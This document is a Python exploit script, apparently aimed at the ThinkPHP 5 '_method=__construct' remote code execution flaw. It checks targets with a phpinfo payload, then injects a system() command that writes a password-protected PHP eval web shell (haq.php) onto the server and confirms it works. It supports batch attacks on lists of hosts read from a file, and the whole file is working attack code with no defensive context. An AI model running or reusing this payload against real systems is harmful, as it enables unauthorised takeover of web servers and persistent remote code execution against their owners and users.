#author:九世
#version:python3
#time:2019/1/11
import requests
import optparse
import os

guanjianzi = "PHP Version"
p1 = '/public/index.php'
p2 = '/index.php'
d1 = '/haq.php'
d3 = '/public/haq.php'
passwd = 'g'
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
payload = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
payload2 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo 'haq<?php @eval($_POST[g]);?>' >> haq.php"
payloads = {}
payloads2 = {}

def main():
    parser=optparse.OptionParser()
    parser.add_option('-r',dest='rhost',help='set rhost')
    parser.add_option('-s',dest='file',help='set file')
    (option,args)=parser.parse_args()
    if option.rhost:
        rhost=option.rhost
        danda(rhost)
    elif option.file:
        files=option.file
        pilian(files)
    else:
        parser.print_help()
        exit()

def danda(rhost):
    if rhost!='' or  ' ':
        mubiao=str(rhost).strip('/')
    else:
        print('[-] Not input " "')
        exit()


    for z in payload.split('&'):
        key, value = z.split('=', 1)
        payloads[key] = value

    for z in payload2.split('&'):
        key, value = z.split('=', 1)
        payloads2[key] = value

    panduan=requests.get(url=mubiao+p1,headers=headers)
    panduan2=requests.get(url=mubiao+p2,headers=headers)
    if panduan.status_code==200:
        print('[h] RHOST:{}'.format(panduan.url))
        rqt=requests.post(url=mubiao+'{}?s=captcha'.format(p1),headers=headers,data=payloads)
        if guanjianzi in rqt.text:
            print('[a] Found debug:{} status:{}'.format(rqt.url,rqt.status_code))
            if guanjianzi in rqt.text:
                print('[a] Found debug:{}'.format(rqt.url))
                rqtws = requests.post(url=mubiao + '{}?s=captcha'.format(p1), headers=headers, data=payloads2)
                rqt3s = requests.get(url=mubiao + '{}'.format(d3), headers=headers)
                if 'haq' in rqt3s.text and rqt3s.status_code == 200:
                    print('[a] getshell ok url:{} password:{}'.format(rqt3s.url, passwd))
                else:
                    print('[q] getshell fuck...')
            else:
                print('[q] Not Found:{} status:{}'.format(rqt.url, rqt.status_code))
        else:
            print('[q] Not Found:{} status:{}'.format(rqt.url,rqt.status_code))
    elif panduan2.status_code==200:
        print('[h] RHOST:{}'.format(panduan2.url))
        rqt=requests.post(url=mubiao+'{}?s=captcha'.format(p2),headers=headers,data=payloads)
        if guanjianzi in rqt.text:
            print('[a] Found debug:{}'.format(rqt.url))
            rqtw=requests.post(url=mubiao + '{}?s=captcha'.format(p2), headers=headers, data=payloads2)
            rqt3=requests.get(url=mubiao+'{}'.format(d1),headers=headers)
            if 'haq' in rqt3.text and rqt3.status_code==200:
                print('[a] getshell ok url:{} password:{}'.format(rqt3.url,passwd))
            else:
                print('[q] getshell fuck...')
        else:
            print('[q] Not Found:{} status:{}'.format(rqt.url,rqt.status_code))
    else:
        print('[q] del /index.php or /public/index.php')

def pilian(files):
    if files !='' or ' ':
        file=files
    else:
        print('[-] Not input " "')
        exit()

    fileq=file
    if os.path.exists(fileq):
        print('[h] Found {}'.format(fileq))
    else:
        print('[q] Found {}'.format(fileq))
        exit()

    for z in payload.split('&'):
        key, value = z.split('=', 1)
        payloads[key] = value

    for z in payload2.split('&'):
        key, value = z.split('=', 1)
        payloads2[key] = value

    dk=open(fileq,'r')
    for r in dk.readlines():
        mubiao="".join(r.split('\n'))
        panduan = requests.get(url=mubiao + p1, headers=headers)
        panduan2 = requests.get(url=mubiao + p2, headers=headers)
        if panduan.status_code == 200:
            print('[h] RHOST:{}'.format(panduan.url))
            rqt = requests.post(url=mubiao + '{}?s=captcha'.format(p1), headers=headers, data=payloads)
            if guanjianzi in rqt.text:
                print('[a] Found debug:{} status:{}'.format(rqt.url, rqt.status_code))
                if guanjianzi in rqt.text:
                    print('[a] Found debug:{}'.format(rqt.url))
                    rqtws = requests.post(url=mubiao + '{}?s=captcha'.format(p1), headers=headers, data=payloads2)
                    rqt3s = requests.get(url=mubiao + '{}'.format(d3), headers=headers)
                    if 'haq' in rqt3s.text and rqt3s.status_code == 200:
                        print('[a] getshell ok url:{} password:{}'.format(rqt3s.url, passwd))
                    else:
                        print('[q] getshell fuck...')
                else:
                    print('[q] Not Found:{} status:{}'.format(rqt.url, rqt.status_code))
            else:
                print('[q] Not Found:{} status:{}'.format(rqt.url, rqt.status_code))
        elif panduan2.status_code == 200:
            print('[h] RHOST:{}'.format(panduan2.url))
            rqt = requests.post(url=mubiao + '{}?s=captcha'.format(p2), headers=headers, data=payloads)
            if guanjianzi in rqt.text:
                print('[a] Found debug:{}'.format(rqt.url))
                rqtw = requests.post(url=mubiao + '{}?s=captcha'.format(p2), headers=headers, data=payloads2)
                rqt3 = requests.get(url=mubiao + '{}'.format(d1), headers=headers)
                if 'haq' in rqt3.text and rqt3.status_code == 200:
                    print('[a] getshell ok url:{} password:{}'.format(rqt3.url, passwd))
                else:
                    print('[q] getshell fuck...')
            else:
                print('[q] Not Found:{} status:{}'.format(rqt.url, rqt.status_code))
        else:
            print('[q] del /index.php or /public/index.php')

if __name__ == '__main__':
    main()